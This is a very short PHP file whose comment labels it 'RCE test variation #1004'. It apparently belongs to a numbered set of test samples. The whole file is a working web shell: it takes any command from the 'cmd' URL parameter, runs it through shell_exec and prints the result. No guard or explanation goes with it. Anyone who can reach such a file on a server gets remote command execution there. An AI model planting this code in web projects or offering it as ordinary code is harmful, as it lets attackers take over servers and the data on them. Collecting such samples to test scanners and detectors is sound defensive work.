<?php
// RCE test variation #1004
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>